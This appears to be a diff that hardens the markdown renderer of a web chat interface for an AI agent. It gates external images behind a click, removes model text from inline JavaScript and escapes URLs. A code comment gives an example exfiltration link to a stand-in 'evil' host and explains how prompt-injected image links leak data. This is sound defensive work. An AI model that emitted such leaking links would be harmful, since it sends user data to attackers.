@@ -1,6 +1,44 @@
 /* ---------------- helpers ---------------- */
 function esc(s) { return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;'); }
 
+// Files served by this app (/agent/raw, /raw) may auto-load. Anything else is
+// click-to-load: an <img> that fetches as soon as a reply renders is a
+// prompt-injection exfiltration channel (![](https://evil/?leak=...)).
+function isLocalMediaUrl(url) {
+  return /^\/(agent\/)?raw\b/.test(String(url || ''));
+}
+
+// `url` / `alt` must already be HTML-escaped.
+function externalImageButton(url, alt) {
+  const host = (String(url).match(/^https?:\/\/([^\/?#]+)/) || [])[1] || 'external site';
+  return `<button type="button" class="file-action-badge" data-load-src="${url}" data-load-alt="${alt || 'Image'}" title="${url}">🖼️ Load image from ${host}</button>`;
+}
+
+// Delegated handlers for markup produced by md() / renderMediaPreviewSection():
+// values arrive via dataset (already decoded), never through inline JS.
+document.addEventListener('click', (e) => {
+  const load = e.target.closest('[data-load-src]');
+  if (load) {
+    e.preventDefault();
+    const img = document.createElement('img');
+    img.src = load.dataset.loadSrc;
+    img.alt = load.dataset.loadAlt || 'Image';
+    img.className = 'chat-inline-img';
+    img.dataset.previewPath = load.dataset.loadSrc;
+    img.dataset.previewTitle = img.alt;
+    img.title = 'Click to enlarge';
+    const card = load.closest('.media-card-thumb-wrap');
+    if (card) { img.className = 'media-card-thumb'; card.replaceChildren(img); }
+    else load.replaceWith(img);
+    return;
+  }
+  const prev = e.target.closest('[data-preview-path]');
+  if (prev && typeof openFilePreview === 'function') {
+    e.preventDefault();
+    openFilePreview(prev.dataset.previewPath, prev.dataset.previewTitle || '');
+  }
+});
+
 function md(s) {
   // split fences BEFORE escaping: hlCode() escapes internally
   const parts = String(s).split(/```/);
@@ -33,22 +71,30 @@ function md(s) {
       t = t.replace(/^#{1,3} (.*)$/gm, '<b>$1</b>');
       t = t.replace(/^\s*[-*] (.*)$/gm, '• $1');
 
+      // `t` is already HTML-escaped here, so captured groups are safe inside a
+      // quoted attribute. Model text never goes into inline JS (onclick=...):
+      // the browser would decode &#39; back to ' and let it break out of the
+      // JS string. Clicks are handled by the delegated [data-preview-path]
+      // listener below instead.
+
       // 1. Render markdown images: ![alt](url)
       t = t.replace(/!\[([^\]]*)\]\(((?:https?:\/\/|\/agent\/raw|\/raw)[^)]+)\)/g, (match, alt, url) => {
-        return `<span class="chat-inline-media"><img src="${url}" alt="${alt}" class="chat-inline-img" loading="lazy" onclick="openFilePreview('${url.replace(/'/g, "\\'")}', '${esc(alt || 'Image').replace(/'/g, "\\'")}')" title="Click to enlarge" /></span>`;
+        if (!isLocalMediaUrl(url)) return externalImageButton(url, alt);
+        return `<span class="chat-inline-media"><img src="${url}" alt="${alt}" class="chat-inline-img" loading="lazy" data-preview-path="${url}" data-preview-title="${alt || 'Image'}" title="Click to enlarge" /></span>`;
       });
 
       // 2. Render links & file download buttons
       t = t.replace(/\[([^\]]+)\]\(((?:https?:\/\/|\/agent\/download|\/download)[^)]+)\)/g, (match, text, url) => {
         if (url.startsWith('/agent/download') || url.startsWith('/download')) {
           const m = url.match(/[?&]path=([^&]+)/);
-          const fpath = m ? decodeURIComponent(m[1]) : text;
+          let fpath = text;
+          if (m) { try { fpath = esc(decodeURIComponent(m[1])); } catch (e) { fpath = m[1]; } }
           return `<span style="display:inline-flex; align-items:center; gap:4px; margin:2px 0;">
-            <button type="button" class="file-action-badge primary" onclick="openFilePreview('${esc(fpath).replace(/'/g, "\\'")}', '${esc(text).replace(/'/g, "\\'")}')" title="Preview ${esc(text)}">👁️ Preview ${esc(text)}</button>
-            <a href="${url}" class="file-action-badge" download title="Download ${esc(text)}">⬇</a>
+            <button type="button" class="file-action-badge primary" data-preview-path="${fpath}" data-preview-title="${text}" title="Preview ${text}">👁️ Preview ${text}</button>
+            <a href="${url}" class="file-action-badge" download title="Download ${text}">⬇</a>
           </span>`;
         }
-        return `<a href="${url}" target="_blank" rel="noopener">${text}</a>`;
+        return `<a href="${url}" target="_blank" rel="noopener noreferrer">${text}</a>`;
       });
 
       // 3. Parse [DOWNLOAD: filename] markers emitted by the agent
@@ -56,8 +102,8 @@ function md(s) {
         const cleanName = fname.trim();
         const url = `/agent/download?path=${encodeURIComponent(cleanName)}`;
         return `<span style="display:inline-flex; align-items:center; gap:4px; margin:2px 0;">
-          <button type="button" class="file-action-badge primary" onclick="openFilePreview('${esc(cleanName).replace(/'/g, "\\'")}', '${esc(cleanName).replace(/'/g, "\\'")}')" title="Preview ${esc(cleanName)}">👁️ Preview ${esc(cleanName)}</button>
-          <a href="${url}" class="file-action-badge" download="${esc(cleanName)}" title="Download ${esc(cleanName)}">⬇ Download</a>
+          <button type="button" class="file-action-badge primary" data-preview-path="${cleanName}" data-preview-title="${cleanName}" title="Preview ${cleanName}">👁️ Preview ${cleanName}</button>
+          <a href="${url}" class="file-action-badge" download="${cleanName}" title="Download ${cleanName}">⬇ Download</a>
         </span>`;
       });
       t = t.replace(/\n/g, '<br>');
@@ -122,8 +168,9 @@ function renderMediaPreviewSection(text) {
     <div class="media-preview-grid">`;
 
   items.forEach(it => {
+    // it.url comes from raw (unescaped) model text: escape for every attribute
     const cleanTitle = esc(it.title || 'Media');
-    const safeUrl = esc(it.url).replace(/'/g, "\\'");
+    const safeUrl = esc(it.url);
 
     if (it.type === 'youtube') {
       const vidMatch = it.url.match(/([a-zA-Z0-9_-]{11})/);
@@ -134,29 +181,34 @@ function renderMediaPreviewSection(text) {
         </div>
         <div class="media-card-footer">
           <span class="media-card-name" title="${cleanTitle}">▶ ${cleanTitle}</span>
-          <a href="${it.url}" target="_blank" rel="noopener" class="media-card-ext-btn" title="Open YouTube">↗</a>
+          <a href="${safeUrl}" target="_blank" rel="noopener noreferrer" class="media-card-ext-btn" title="Open YouTube">↗</a>
         </div>
       </div>`;
     } else if (it.type === 'video') {
+      // preload="none": nothing is fetched until the user presses play
       html += `<div class="media-card media-card-video">
         <div class="media-video-frame">
-          <video controls preload="metadata" src="${it.url}"></video>
+          <video controls preload="none" src="${safeUrl}"></video>
         </div>
         <div class="media-card-footer">
           <span class="media-card-name" title="${cleanTitle}">🎬 ${cleanTitle}</span>
-          <a href="${it.url}" target="_blank" rel="noopener" class="media-card-ext-btn" title="Open Video">↗</a>
+          <a href="${safeUrl}" target="_blank" rel="noopener noreferrer" class="media-card-ext-btn" title="Open Video">↗</a>
         </div>
       </div>`;
     } else {
-      // Image
-      html += `<div class="media-card media-card-img" onclick="openFilePreview('${safeUrl}', '${cleanTitle}')">
+      // Image: local files load right away, external ones only on click
+      const thumb = esc(it.thumb || it.url);
+      const media = isLocalMediaUrl(it.url)
+        ? `<img src="${thumb}" class="media-card-thumb" loading="lazy" alt="${cleanTitle}" data-preview-path="${safeUrl}" data-preview-title="${cleanTitle}" onerror="this.closest('.media-card').style.display='none'" />`
+        : externalImageButton(thumb, cleanTitle);
+      html += `<div class="media-card media-card-img">
         <div class="media-card-thumb-wrap">
-          <img src="${it.thumb || it.url}" class="media-card-thumb" loading="lazy" alt="${cleanTitle}" onerror="this.closest('.media-card').style.display='none'" />
+          ${media}
           <span class="media-badge">IMAGE</span>
         </div>
         <div class="media-card-footer">
           <span class="media-card-name" title="${cleanTitle}">${cleanTitle}</span>
-          <a href="${it.url}" target="_blank" rel="noopener" class="media-card-ext-btn" onclick="event.stopPropagation()" title="Open Original">↗</a>
+          <a href="${safeUrl}" target="_blank" rel="noopener noreferrer" class="media-card-ext-btn" title="Open Original">↗</a>
         </div>
       </div>`;
     }
